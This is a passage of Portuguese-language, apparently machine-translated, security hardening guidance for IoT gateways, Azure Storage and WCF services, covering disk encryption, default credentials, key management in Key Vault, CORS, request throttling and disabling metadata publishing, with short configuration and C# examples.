| **Componente**               | Gateway de campo de IoT | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Windows 10 IoT Core implementa uma versão simples da encriptação de dispositivo do cacifo de bits, que tem uma dependência forte na presença de um TPM na plataforma, incluindo o protocolo necessário preOS em UEFI que efetua os valores necessários. Estas medidas preOS Certifique-se de que o SO posterior tem um registo definitiva de como o sistema operativo foi iniciado. Encriptar as partições de SO utilizando também cacifo de bits e quaisquer partições adicionais caso armazenam dados confidenciais. |

## <a id="default-change"></a>Certifique-se de que as credenciais de início de sessão predefinidas do gateway de campo são alteradas durante a instalação

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de campo de IoT | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Certifique-se de que as credenciais de início de sessão predefinidas do gateway de campo são alteradas durante a instalação |

## <a id="cloud-firmware"></a>Certifique-se de que o Gateway de nuvem implementa um processo para manter o firmware de dispositivos ligados atualizados

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de nuvem do IoT | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | Opção de gateway - IoT Hub do Azure |
| **Referências**              | [Descrição geral gestão de dispositivos do Hub IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [como atualizar o Firmware do dispositivo](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Passos** | LWM2M é um protocolo do abrir Alliance móvel para gestão de dispositivos de IoT. Permite a gestão de dispositivos IoT do Azure para interagir com dispositivos físicos com tarefas do dispositivo. Certifique-se de que o Gateway de nuvem implementa um processo de manter regularmente o dispositivo e outros dados de configuração atualizados com gestão de dispositivos do Azure IoT Hub. |

## <a id="controls-policies"></a>Certifique-se de que os dispositivos têm de controlos de segurança do ponto final configurados de acordo com as políticas de organizacionais

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Limite de fidedignidade de máquina | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Certifique-se de que os dispositivos têm de controlos de segurança do ponto final, tais como o cacifo de bits para a encriptação de nível de disco, software antivírus com assinaturas atualizadas, firewall com base, as atualizações do SO do anfitrião, etc. são configurados de acordo com as políticas de segurança organizacional de políticas de grupo. |

## <a id="secure-keys"></a>Certifique-se seguro gestão das chaves de acesso de armazenamento do Azure

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Storage do Azure | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Guia de segurança de armazenamento do Azure - gestão de chaves de conta de armazenamento do](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Passos** | <p>Armazenamento de chaves: Se recomenda armazenar as chaves de acesso de armazenamento do Azure no Cofre de chaves do Azure como um segredo e que as aplicações obter a chave do Cofre de chaves. Isto é recomendado devido pelas seguintes razões:</p><ul><li>A aplicação nunca será tem o codificado de chave de armazenamento num ficheiro de configuração, que elimina essa compromissos alguém obter acesso às chaves sem permissão específico</li><li>Acesso às chaves pode ser controlado através do Azure Active Directory. Isto significa que um proprietário da conta pode conceder acesso a alguns das aplicações que precisam para obter as chaves a partir do Cofre de chaves do Azure. Outras aplicações não será possível para as chaves de acesso sem conceder-lhes permissão especificamente</li><li>Regeneração da chave: Recomenda-se ter um processo no local para voltar a gerar chaves de acesso de armazenamento do Azure por motivos de segurança. Detalhes sobre o motivo e sobre como planear regeneração da chave documentados no artigo de referência do guia de segurança de armazenamento do Azure</li></ul>|

## <a id="cors-storage"></a>Certifique-se de que apenas fidedignas origens são permitidas se CORS ativada no armazenamento do Azure

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Storage do Azure | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Suporte de CORS para os serviços de armazenamento do Azure](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Passos** | Armazenamento do Azure permite-lhe ativar o CORS – cruzam a partilha de recursos de origem. Para cada conta de armazenamento, pode especificar os domínios que podem aceder aos recursos na conta do storage. Por predefinição, a CORS está desativada em todos os serviços. Pode ativar a CORS utilizando a API REST ou biblioteca de clientes do storage para chamar um dos métodos para definir as políticas de serviço. |

## <a id="throttling"></a>Ativar o serviço de WCF funcionalidade de limitação

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET framework 3 |
| **Atributos**              | N/D  |
| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Unido](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Passos** | <p>Não colocar um limite na utilização de recursos do sistema pode resultar em esgotamento de recursos e, em última análise um denial of service.</p><ul><li>**EXPLICAÇÃO:** Windows Communication Foundation (WCF) oferece a capacidade de limitação de pedidos de serviço. Permitir demasiados pedidos de cliente pode inundar um sistema e a esgotar os respetivos recursos. Por outro lado, permitir que apenas um pequeno número de pedidos para um serviço pode impedir os utilizadores legítimos utilizando o serviço. Cada serviço deve ser individualmente otimizado para e configurado para permitir a quantidade de recursos adequada.</li><li>**RECOMENDAÇÕES** funcionalidade de limitação do serviço de ativar a WCF e limites de conjunto adequado para a sua aplicação.</li></ul>|

### <a name="example"></a>Exemplo
Segue-se um exemplo de configuração com limitação ativada:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Divulgação de informações de WCF através de metadados

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET framework 3 |
| **Atributos**              | N/D  |
| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Unido](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Passos** | Metadados podem ajudar os atacantes Saiba mais sobre o sistema e planear um formulário de ataque. Serviços WCF podem ser configurados para expor os metadados. Metadados dá-informações de descrição do serviço de detalhado e não devem ser difusão em ambientes de produção. O `HttpGetEnabled`  /  `HttpsGetEnabled` propriedades da classe ServiceMetaData define se um serviço irá expor os metadados | 

### <a name="example"></a>Exemplo
O código abaixo dá instruções ao WCF para difundir metadados de um serviço
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Não de difusão de metadados do serviço num ambiente de produção. Definir o HttpGetEnabled / HttpsGetEnabled de propriedades do ServiceMetaData classe como false. 

### <a name="example"></a>Exemplo
O código abaixo dá instruções ao WCF para difundir não os metadados de um serviço. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
